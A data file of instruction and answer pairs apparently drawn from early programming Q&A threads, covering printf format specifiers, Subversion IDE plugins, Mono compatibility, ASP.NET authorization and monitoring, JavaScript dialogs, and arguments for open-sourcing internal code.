{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "In short, those values after the % tell printf how to interpret (or output) all of the variables coming later.  In your example, radius is interpreted as a float (this the 'f'), and the 10.1 gives information about how many decimal places to use when printing it out.\nSee this link for more details about all of the modifiers you can use with printf."}
{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "Man pages contain the information you want. To read what you have above:\nprintf( \"%10.2f\", 1.5 )\n\nThis will print:\n         1.50\n\nWhereas:\nprintf(\"%.2f\", 1.5 )\n\nPrints:\n1.50\n\nNote the justification of both.\nSimilarly:\nprintf(\"%10.1f\", 1.5 )\n\nWould print:\n        1.5\n\nAny number after the . is the precision you want printed. Any number before the . is the distance from the left margin."}
{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "10.1f means floating point with 10 characters  wide with 1 place after the decimal point.\nIf the number has less than 10 digits, it's padded with spaces.\n10.2f is the same, but with 2 places after the decimal point.\nYou have these basic types:\n%d   - integer\n%x   - hex integer\n%s   - string\n%c   - char (only one)\n%f   - floating point (float)\n%d   - signed int (decimal)\n%i   - signed int (integer) (same as decimal).\n%u   - unsigned int\n%ld  - long (signed) int\n%lu  - long unsigned int\n%lld - long long (signed) int\n%llu - long long unsigned int\n\nEdit: there are several others listed in @Eli's response (man 3 printf)."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "Older AnkhSVN (pre 2.0) was very crappy and I was only using it for shiny icons in the solution explorer. I relied on Tortoise for everything except reverts.\nThe newer Ankh is a complete rewrite (it is now using the Source Control API of the IDE) and looks & works much better. Still, I haven't forced it to any heavy lifting. Icons is enough for me.\nThe only gripe I have with 2.0 is the fact that it slaps its footprint to .sln files. I always revert them lest they cause problems for co-workers who do not have Ankh installed. Dunno if my fears are groundless or not.\n\naddendum:\nI have been using v2.1.7141 a bit more extensively for the last few weeks and here are the new things I have to add:\n\nNo ugly crashes that plagued v1.x. Yay!\nFor some reason, \"Show Changes\" (diff) windows are limited to only two. Meh.\nDiff windows do not allow editing/reverting yet. Boo!\nUpdates, commits and browsing are MUCH faster than Tortoise. Yay!\n\nAll in all, I would not use it standalone, but once you start using it, it becomes an almost indispensable companion to Tortoise."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "I tried version 1, and it was unreliable to say the least. I can't say anything about 2.0.\nIf you can afford it, the one I use, VisualSVN, is very good and uses TortoiseSVN for all its gui, except for the specialized things related to its VS integration."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "I always had stability issues with AnkhSVN. I couldn't switch everyone to Subversion where I work without an integrated solution.\nThank goodness for VisualSVN + TortoiseSVN.\nVisualSVN isn't free, but it is cheap, and works a treat."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "I tried AnkhSVN (1.0.3, just 4 months ago), and it did not work the way I wanted it to (i.e. needed to select things in the browser window instead of based on active file). I ended up making some macros that utilize TortoiseSVN that work much more like what I expected.\nI've been very happy with using TortoiseSVN via explorer and my macros inside the IDE."}
{"instruction": "Has anyone worked out how to get PowerShell to use app.config files? I have a couple of .NET DLL's I'd like to use in one of my scripts but they expect their own config sections to be present in app.config/web.config.", "output": "I'm guessing that the settings would have to be in powershell.exe.config in the powershell directory, but that seems to be a bad way of doing things.\nYou can use ConfigurationManager.OpenMappedExeConfiguration to open a configuration file based on the executing DLL name, rather than the application exe, but this would obviously require changes to the DLLs."}
{"instruction": "Are there any open source (or I guess commercial) packages that you can plug into your site for monitoring purposes? I'd like something that we can hook up to our ASP.NET site and use to provide reporting on things like:\n\nperformance over time\ncurrent load\npage traffic\nSQL performance\nPU time monitoring \n\nIdeally in c# :)\nWith some sexy graphs.\nEdit: I'd also be happy with a package that I can feed statistics and views of data to, and it would analyse trends, spot abnormal behaviour (e.g. \"no one has logged in for the last hour. is this Ok?\", \"high traffic levels detected\", \"low number of API calls detected\")  and generally be very useful indeed. Does such a thing exist?\nAt my last office we had a big screen which showed us loads and loads of performance counters over a couple of time ranges, and we could spot weird stuff happening, but the data was not stored and there was no way to report on it. Its a package for doing this that I'm after.", "output": "Google Analytics is free (up to 50,000 hits per month I think) and is easy to setup with just a little javascript snippet to insert into your header or footer and has great detailed reports, with some very nice graphs."}
{"instruction": "Are there any open source (or I guess commercial) packages that you can plug into your site for monitoring purposes? I'd like something that we can hook up to our ASP.NET site and use to provide reporting on things like:\n\nperformance over time\ncurrent load\npage traffic\nSQL performance\nPU time monitoring \n\nIdeally in c# :)\nWith some sexy graphs.\nEdit: I'd also be happy with a package that I can feed statistics and views of data to, and it would analyse trends, spot abnormal behaviour (e.g. \"no one has logged in for the last hour. is this Ok?\", \"high traffic levels detected\", \"low number of API calls detected\")  and generally be very useful indeed. Does such a thing exist?\nAt my last office we had a big screen which showed us loads and loads of performance counters over a couple of time ranges, and we could spot weird stuff happening, but the data was not stored and there was no way to report on it. Its a package for doing this that I'm after.", "output": "Google Analytics is quick to set up and provides more sexy graphs than you can shake a stick at.\nhttp://www.google.com/analytics/"}
{"instruction": "I've found a few resources on the subject, but they all require a deep understanding of SmallTalk or Haskell, neither of which I know.", "output": "I found an interesting article about implementing a parser combinator in C#. It also references some more general papers on the subject.\nThe Wikipedia article on the subject also has a general explaination of the concept."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "I started with AnkhSvn and then moved on to VisualSvn. I have my own gripes with VisualSvn but its far less trouble compared to Ankh. I'm yet to try the new version of Ankh which they say is a complete rewrite and had inputs from Microsoft dev team as well."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "I've been using both the newest version of Ankh SVN and Tortoise on a project at home. I find them to both be very good with a caveat.\nI've found that both SVN tools have at times failed to keep up with my file/folder renaming and moving resulting in it thinking that a perfectly good file needs to be deleted on the next commit. This is probably down to me misusing SVN in some way but TFS at work does not have this problem."}
{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "10.1f means floating point with 1 place after the decimal point and the 10 places before the decimal point. If the number has less than 10 digits, it's padded with spaces. 10.2f is the same, but with 2 places after the decimal point.\n\nOn every system I've seen, from Unix to Rails Migrations, this is not the case.  @robintw expresses it best:\n\nBasically in a simple form it's %[width].[precision][type].\n\nThat is, not \"10 places before the decimal point,\" but \"10 places, both before and after, and including the decimal point.\""}
{"instruction": "Are there any open source (or I guess commercial) packages that you can plug into your site for monitoring purposes? I'd like something that we can hook up to our ASP.NET site and use to provide reporting on things like:\n\nperformance over time\ncurrent load\npage traffic\nSQL performance\nPU time monitoring \n\nIdeally in c# :)\nWith some sexy graphs.\nEdit: I'd also be happy with a package that I can feed statistics and views of data to, and it would analyse trends, spot abnormal behaviour (e.g. \"no one has logged in for the last hour. is this Ok?\", \"high traffic levels detected\", \"low number of API calls detected\")  and generally be very useful indeed. Does such a thing exist?\nAt my last office we had a big screen which showed us loads and loads of performance counters over a couple of time ranges, and we could spot weird stuff happening, but the data was not stored and there was no way to report on it. Its a package for doing this that I'm after.", "output": "Not Invented here but it's on my todo list to setup.\nhttp://awstats.sourceforge.net/"}
{"instruction": "Are there any open source (or I guess commercial) packages that you can plug into your site for monitoring purposes? I'd like something that we can hook up to our ASP.NET site and use to provide reporting on things like:\n\nperformance over time\ncurrent load\npage traffic\nSQL performance\nPU time monitoring \n\nIdeally in c# :)\nWith some sexy graphs.\nEdit: I'd also be happy with a package that I can feed statistics and views of data to, and it would analyse trends, spot abnormal behaviour (e.g. \"no one has logged in for the last hour. is this Ok?\", \"high traffic levels detected\", \"low number of API calls detected\")  and generally be very useful indeed. Does such a thing exist?\nAt my last office we had a big screen which showed us loads and loads of performance counters over a couple of time ranges, and we could spot weird stuff happening, but the data was not stored and there was no way to report on it. Its a package for doing this that I'm after.", "output": "@Ian\nLooks like they've raised the limit. Not very surprising, it is google after all ;)\n\nThis free version is limited to 5 million pageviews a month - however, users with an active Google AdWords account are given unlimited pageview tracking.\n\nhttp://www.google.com/support/googleanalytics/bin/answer.py?hl=en&answer=55543"}
{"instruction": "The creation date of an executable linked in VS2005 is not set to the real creation-date of the exe-file. Only a complete re-build will set the current date, a re-link will not do it. Obviously the file is set to some date, which is taken from one of the project-files. \nSo: is there a way to force the linker to set the creation-date to the real link-date?", "output": "Delete the executable as part of a pre-link event.\nEdit:\nHah, I forgot about Explorer resetting the creation date if you name a file exactly the same as a file that was recently deleted.\nWhy are you keying off the creation date anyway?"}
{"instruction": "The creation date of an executable linked in VS2005 is not set to the real creation-date of the exe-file. Only a complete re-build will set the current date, a re-link will not do it. Obviously the file is set to some date, which is taken from one of the project-files. \nSo: is there a way to force the linker to set the creation-date to the real link-date?", "output": "A complete rebuild will delete that file forcing the linker to create it, hence the reason it gets a new creation date.  You could try disabling incremental linking under project properties (Linker | General).  If that doesn't do it you could add a build event to delete the exe file and force it to create a new file each time.  Both of these things could increase your build time."}
{"instruction": "Within Ruby on Rails applications database.yml is a plain text file that stores database credentials.\nWhen I deploy my Rails applications I have an after deploy callback in my Capistrano \nrecipe that creates a symbolic link within the application's /config directory to the database.yml file. The file itself is stored in a separate directory that's outside the standard Capistrano /releases directory structure. I chmod 400 the file so it's only readable by the user who created it.\n\nIs this sufficient to lock it down? If not, what else do you do?\nIs anyone encrypting their database.yml files?", "output": "You'll also want to make sure that your SSH system is well secured to prevent people from logging in as your Capistrano bot.  I'd suggest restricting access to password-protected key pairs.\nEncrypting the .yml file on the server is useless since you have to give the bot the key, which would be stored . . . on the same server.  Encrypting it on your machine is probably a good idea.  Capistrano can decrypt it before sending."}
{"instruction": "The creation date of an executable linked in VS2005 is not set to the real creation-date of the exe-file. Only a complete re-build will set the current date, a re-link will not do it. Obviously the file is set to some date, which is taken from one of the project-files. \nSo: is there a way to force the linker to set the creation-date to the real link-date?", "output": "Deleting the executable doesn't do the job. That's the problem. Also I could not identify any projectfile, whose datetime was the same as the later linked executable. That lets me conclude, that the 'creation date' is an information taken from within some project-file.\nThe project has 400000 lines, so a full build is no option."}
{"instruction": "What is the best way to authorize all users to one single page in a asp.net website.\nFor except the login page and one other page, I deny all users from viewing pages in the website. \nHow do you make this page accessible to all users?", "output": "I've been using forms authentication and creating the necessary GenericIdentity and CustomPrincipal objects that allows me to leverage the User.IsInRole type functions you typically only get with Windows authentication.\nThat way in my web.config file, I can do stuff like...\n<location path=\"Login.aspx\">\n   <system.web>\n      <authorization>\n         <allow users =\"*\" />\n      </authorization>\n   </system.web>\n</location>\n\n<location path=\"ManagementFolder\">\n   <system.web>\n      <authorization>\n         <allow roles =\"Administrator, Manager\" />\n      </authorization>\n   </system.web>\n</location>"}
{"instruction": "What is the best way to authorize all users to one single page in a asp.net website.\nFor except the login page and one other page, I deny all users from viewing pages in the website. \nHow do you make this page accessible to all users?", "output": "I created a base \"page\" class that handles that sort of thing. All my pages can then be decorated with the RequiresLogin attribute if a login is required to view them. If the attribute is not present, the page is accessible to all.\nExample:\n<RequiresLogin()> _ \n<RequiresPermission(\"process\")> _\nPartial Class DesignReviewEditProgressPage\n    Inherits MyPage 'which inherits System.Web.UI.Page and deal with logins itself\n\n    ...\nEnd Class\n\nThe MyPage class checks what attributes are being tagged to itself and if RequiresLogin is present, it forwards you to a login page.\nI believe this could be adapted to fit your own problem."}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "In many cases, you can take existing code and just run it on Mono, particularly if you're porting an ASP.NET application.\nIn some cases, you may require whole new sections of code to make it work. If you use System.Windows.Forms, for example, the application won't work unmodified. Likewise if you use any Windows-specific code (registry access code, for example). But I think the worst offender is UI code. That's particularly bad on Macintosh systems."}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "On the desktop side, Mono works great if you commit to using GTK#. The Windows.Forms implementation is still a little buggy (for example, TrayIcon's don't work) but it has come a long way. Besides, GTK# is a better toolkit than Windows Forms as it is.\nOn the web side, Mono has implemented enough of ASP.NET to run most sites perfectly. The difficulty here is finding a host that has mod_mono installed on apache, or doing it yourself if you have shell access to your host.\nEither way, Mono is great, and stable. \nKey things to remember when creating a cross platform program:\n\nUse GTK# instead of Windows.Forms\nEnsure to properly case your filenames\nUse Path.Separator instead of hardcoding \"\\\", also use Environment.NewLine instead of \"\\n\".\nDo not use any P/Invoked calls to Win32 API.\nDo not use the Windows Registry."}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "It has pretty extensive coverage up to .NET 4.0 and even include some features from .NET 4.5 APIs, but there are a few areas that we have chosen not to implement due to the APIs being deprecated, new alternatives being created or the scope being too large.   The following APIs are not available in Mono:\n\nWindows Presentation Foundation\nWindows Workflow Foundation (neither of the two versions)\nEntity Framework\nThe WSE1/WSE2 \"add-ons\" to the standard Web Services stack\n\nAdditionally, our WCF implementation is limited to what Silverlight supported.\nThe easiest way to check for your specific project is to run the Mono Migration Analyzer (MoMA). The benefit is that it will notify the Mono team of issues which will prevent you from using Mono (if any), which lets them prioritize their work.\nI recently ran MoMA on SubSonic and found only one issue - a weird use of Nullable types. That's a big codebase, so the coverage there was pretty impressive.\nMono is in active use in several commercial as well as open source products. It's in use in some large applications, such as Wikipedia and the Mozilla Developer Center, and has been used in embedded applications such as the Sansa MP3 players and powers thousands of published games.\nAt the language level, the Mono compiler is fully compliant with the C# 5.0 language specification."}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "It really depends on the namespaces and classes that you are using from the .NET framework.  I had interest in converting one of my windows services to run on my email server, which is Suse, but we ran into several hard roadblocks with APIs that had not been completely implemented.  There is a chart somewhere on the Mono website that lists all of the classes and their level of completion.  If your application is covered, then go for it.\nLike any other application, do prototyping and testing before you make a full commitment, of course.\nAnother problem we ran into is licensed software: if you are referencing someone else's DLL, you can't code your way around incompatibilities that are buried in that assembly."}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "Do you know how good Mono 2.0 preview's support is for Windows Forms 2.0?\n\nFrom the little bit that I've played with it, it seemed relatively complete and almost usable.  It just didn't quite look right in some places and is still a little hit or miss overall.  It amazed me that it worked as well as it did with some of our forms, though honestly."}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "I would imagine then if you have an application with some 3rd party components you may be stuffed.  I doubt a lot of vendors will develop with Mono in mind\nExample: http://community.devexpress.com/forums/p/55085/185853.aspx"}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "We've been using it for a project here at work that needed to run on Linux but reuse some .NET libraries that we built in Managed C++.  I've been very surprised at how well it has worked out.  Our main executable is being written in C# and we can just reference our Managed C++ binaries with no issue.  The only difference in the C# code between Windows and Linux is RS232 serial port code.\nThe only big issue I can think of happened about a month ago.  The Linux build had a memory leak that wasn't seen on the Windows build.  After doing some manual debugging (the basic profilers for Mono on Linux didn't help much), we were able to narrow the issue down to a specific chunk of code.  We ended up patching a workaround, but I still need to find some time to go back and figure out what the root cause of the leak was."}
{"instruction": "I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.\nNow I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).\nWhat would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?", "output": "Popularity\nCommunity contribution\nPublic scrutiny\nWe will be forced to adhere to standards. (which will in turn make the product better)\nGoodwill"}
{"instruction": "I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.\nNow I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).\nWhat would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?", "output": "I think the crux of the reason that open source is a good idea is because you pool together a LARGE resource of people usually working for free to create something useful and exciting. A site like Digg is churning out more and better stories than the staff @ Slashdot could because the community drives it. So too, could an open source project get more done than a dedicated team IF you have a project exciting enough to draw in participation. There's also many other benefits like improving your code and learning along the way."}
{"instruction": "I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.\nNow I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).\nWhat would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?", "output": "Publicity: You could exemplify with the Ruby on Rails framework. \nIt was created to do the 37signals web apps. They open sourced it, then someone came along and build twitter. Imagine the publicity they had from that!"}
{"instruction": "I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.\nNow I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).\nWhat would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?", "output": "The OSI has a number of good resources with http://www.opensource.org/advocacy/case_for_business.php probably being the most relevant for you.\nThere are loads of open source projects and when popular, the best advantage in my opinion is having bug fixes and enhancements contributed back into the project. You tend to only develop the necessary features for the use case at your job (exceptions do exist of course) and it's good to have other people work on other areas of the project.\nThat said, people will usually only do that if they have a use for the project themselves and raising awareness can be just as hard as marketing a commercial project - you will probably find only a few people use it having stumbled upon the project through an obscure Google search!\nAs such, whilst there are a lot of development oriented advantages, even if there aren't many (or any) actual users, it looks very good from a business/company perspective that your organisation is supporting the release of internal projects under open source licenses. This shows good things to prospective employees about the openess of the organisation.\nSo whilst you only get the big open source advantages with scale, there are less obvious ones that start working immediately, namely building a good name for your company."}
{"instruction": "I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.\nNow I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).\nWhat would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?", "output": "The most important contribution of making a product open source is that it instantly becomes more accessible for people. \nIt also helps people who are really interested in your work to see what you have done, make suggestions on improving it and even lend you a hand in doing so sometimes. In addition, you contribute something to the vast repository of open source software and help the community grow and learn in your own small way."}
{"instruction": "When opening a file from your hard drive into your browser, where is the document root?  To illustrate, given the following HTML code, if the page is opened from the local machine(file:///) then where should the css file be for the browser to find it?\n<link href=\"/temp/test.css\" rel=\"stylesheet\" type=\"text/css\" />", "output": "It depends on what browser you use, but Internet Explorer, for example, would take you to the root directory of your harddrive (eg. C:/), while browsers such as Firefox does nothing."}
{"instruction": "I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.\nNow I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).\nWhat would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?", "output": "Benefits to your company are few. All of the reasons others have given assume a degree of popularity that is... unlikely. Most business folks are going to realize that without needing to think very hard about it so they aren't going to find advertising or leverage or public scrutiny or tool improvement enough of a reason to take the \"risk\" of releasing it as open source.\nThat said, here's the best counter to the \"risk\" argument for a company to release an internal tool as Open Source: if it isn't part of your core competency and care is taken so that it doesn't suck company resources (or expose company secrets/infrastructure), there really is no risk. The company loses nothing and gains a potential for gain\u2014even if that potential is small."}
{"instruction": "I know this site is written using ASP.Net MVC and I do not see \"/Home\" in the url.  This proves to me that it can be done.  What special route and do I need?", "output": "If you're running on IIS 7, you can simply delete the Default.aspx file that comes with ASP.NET MVC (assuming you're running on Preview 3 or higher). That file was needed due to an issue with Cassini that was fixed in .NET 3.5 SP1. For more details check out:\nhttp://haacked.com/archive/2008/04/10/upcoming-changes-in-routing.aspx\nand\nhttp://haacked.com/archive/2008/05/12/sp1-beta-and-its-effect-on-mvc.aspx"}
{"instruction": "I could only find the function confirm() that gives OK/Cancel buttons. Is there any way to give Yes/No buttons?", "output": "No.\nInstead you could use a in browser modal popup."}
{"instruction": "I could only find the function confirm() that gives OK/Cancel buttons. Is there any way to give Yes/No buttons?", "output": "Javascript offers 3 modal boxes.  Prompt, confirm and alert.  None of those satisfy your request.  \nThere are a plethora of js modal popup solutions.  Here's an example.\n\nModalBox"}
{"instruction": "I could only find the function confirm() that gives OK/Cancel buttons. Is there any way to give Yes/No buttons?", "output": "No, but there are JavaScript libraries that can accomplish this for you. Just as an example, Ext JS can be used to create a message box dialog."}
{"instruction": "When opening a file from your hard drive into your browser, where is the document root?  To illustrate, given the following HTML code, if the page is opened from the local machine(file:///) then where should the css file be for the browser to find it?\n<link href=\"/temp/test.css\" rel=\"stylesheet\" type=\"text/css\" />", "output": "Eric, the document root is the folder in which your file is, wherever it may be."}
{"instruction": "I could only find the function confirm() that gives OK/Cancel buttons. Is there any way to give Yes/No buttons?", "output": "Like everyone else above says, you're stuck with OK/Cancel using confirm().\nI would like to recommend this jQuery plugin though: jqModal. I've used it on 3 recent projects and it has worked great for each one. Specifically check out this example:\n\n6). FUN! Overrides -- a. view (alert), b. view (confirm) It is now time to\n  show a real-world use for jqModal --\n  overriding the standard alert() and\n  confirm dialogs! Note; due to the\n  single threaded nature of javascript,\n  the confirm() function must be passed\n  a callback -- it does NOT return\n  true/false."}
{"instruction": "When opening a file from your hard drive into your browser, where is the document root?  To illustrate, given the following HTML code, if the page is opened from the local machine(file:///) then where should the css file be for the browser to find it?\n<link href=\"/temp/test.css\" rel=\"stylesheet\" type=\"text/css\" />", "output": "On a Mac, the document root is what you see in the window that appears after you double click on the main hard drive icon on your desktop. The temp folder needs to be in there for a browser to find the CSS file as you have it written in your code. \nActually, you could also write the code like this:\n<link href=\"file:///temp/test.css\" rel=\"stylesheet\" type=\"text/css\" />"}
{"instruction": "I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.\nNow I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).\nWhat would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?", "output": "I've released a couple of company-time developed packages as open source. The basic pitch:\nIt is more profitable or advantageous to the company to release this:\n\nthis package is not part of our core business.  We're not giving away the recipe to the secret sauce.\nwe will get a bigger body of people exercising the code, finding bugs and thereby increasing the code quality.\nit's likely we can find some people who will contribute code for features that we might find useful.\ngood recruiting tool, part 1: good programmers will be attracted to our enlightened developer-friendly organization.\ngood recruiting tool, part 2: we can see some people in action who we might be interested in recruiting.\n\nHere's are two standalone packages that were released via this approach:\n\nhttp://code.google.com/p/orapig -- pretty recent\nhttp://sourceforge.net/projects/kap/ -- at my old company"}
{"instruction": "I have a bunch of files (TV episodes, although that is fairly arbitrary) that I want to check match a specific naming/organisation scheme..\nCurrently: I have three arrays of regex, one for valid filenames, one for files missing an episode name, and one for valid paths.\nThen, I loop though each valid-filename regex, if it matches, append it to a \"valid\" dict, if not, do the same with the missing-ep-name regexs, if it matches this I append it to an \"invalid\" dict with an error code (2:'missing epsiode name'), if it matches neither, it gets added to invalid with the 'malformed name' error code.\nThe current code can be found here\nI want to add a rule that checks for the presence of a folder.jpg file in each directory, but to add this would make the code substantially more messy in it's current state.. \nHow could I write this system in a more expandable way?\nThe rules it needs to check would be..\n\nFile is in the format Show Name - [01x23] - Episode Name.avi or Show Name - [01xSpecial02] - Special Name.avi or Show Name - [01xExtra01] - Extra Name.avi\nIf filename is in the format Show Name - [01x23].avi display it a 'missing episode name' section of the output\nThe path should be in the format Show Name/season 2/the_file.avi (where season 2 should be the correct season number in the filename)\neach Show Name/season 1/ folder should contain \"folder.jpg\"\n\n.any ideas? While I'm trying to check TV episodes, this concept/code should be able to apply to many things..\nThe only thought I had was a list of dicts in the format:\nchecker = [\n{\n    'name':'valid files',\n    'type':'file',\n    'function':check_valid(), # runs check_valid() on all files\n    'status':0 # if it returns True, this is the status the file gets\n}", "output": "maybe you should take the approach of defaulting to: \"the filename is correct\" and work from there to disprove that statement:\nwith the fact that you only allow filenames with: 'show name', 'season number x episode number' and 'episode name', you know for certain that these items should be separated by a \"-\" (dash) so you have to have 2 of those for a filename to be correct.\nif that checks out, you can use your code to check that the show name matches the show name as seen in the parent's parent folder (case insensitive i assume), the season number matches the parents folder numeric value (with or without an extra 0 prepended).\nif however you don't see the correct amount of dashes you instantly know that there is something wrong and stop before the rest of the tests etc.\nand separately you can check if the file folder.jpg exists and take the necessary actions. or do that first and filter that file from the rest of the files in that folder."}
{"instruction": "Are there any open source (or I guess commercial) packages that you can plug into your site for monitoring purposes? I'd like something that we can hook up to our ASP.NET site and use to provide reporting on things like:\n\nperformance over time\ncurrent load\npage traffic\nSQL performance\nPU time monitoring \n\nIdeally in c# :)\nWith some sexy graphs.\nEdit: I'd also be happy with a package that I can feed statistics and views of data to, and it would analyse trends, spot abnormal behaviour (e.g. \"no one has logged in for the last hour. is this Ok?\", \"high traffic levels detected\", \"low number of API calls detected\")  and generally be very useful indeed. Does such a thing exist?\nAt my last office we had a big screen which showed us loads and loads of performance counters over a couple of time ranges, and we could spot weird stuff happening, but the data was not stored and there was no way to report on it. Its a package for doing this that I'm after.", "output": "If you're after things like server data, would RRDTool be something you're after?\nIt's not really a webserver type stats program though, I have no idea how it would scale.\nEdit:\nI've also just found Splunk Swarm, if you're interested in something that looks \"cool\"."}
